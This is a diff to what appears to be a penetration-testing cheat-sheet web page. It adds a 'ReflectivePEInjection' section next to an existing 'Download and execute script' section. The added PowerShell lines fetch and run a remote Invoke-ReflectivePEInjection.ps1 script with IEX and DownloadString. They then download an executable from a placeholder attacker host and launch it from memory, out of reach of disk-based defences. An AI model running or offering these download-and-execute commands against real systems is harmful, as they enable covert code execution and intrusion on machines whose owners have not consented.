@@ -92,6 +92,8 @@
     
         <li><a class="" href="#download-and-execute-script">Download and execute script</a></li>
     
+        <li><a class="" href="#reflectivepeinjection">ReflectivePEInjection</a></li>
+    
         <li><a class="" href="#execute-c-dll-from-powershell">Execute C# DLL from Powershell</a></li>
     
         <li><a class="" href="#activedirectory-module-without-rsat">ActiveDirectory Module without RSAT</a></li>
@@ -405,6 +407,12 @@ You need to add the following line at the end:</p>
 </ul>
 <p>On the remote host, execute the following PowerShell script:</p>
 <pre><code class="language-powershell">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
+</code></pre>
+<h2 id="reflectivepeinjection">ReflectivePEInjection</h2>
+<p>Start an executable from memory:</p>
+<pre><code class="language-powershell">IEX (New-Object System.Net.WebClient).DownloadString(&quot;https://security-tips.vincd.com/assets/Invoke-ReflectivePEInjection.ps1&quot;)
+$ExeBytes = IWR &quot;http://&lt;ip&gt;:&lt;port&gt;/x.exe&quot; | Select-Object -ExpandProperty Content
+Invoke-ReflectivePEInjection -PEBytes $ExeBytes
 </code></pre>
 <h2 id="execute-c-dll-from-powershell">Execute C# DLL from Powershell</h2>
 <pre><code class="language-powershell"># Load a dll to Powershell
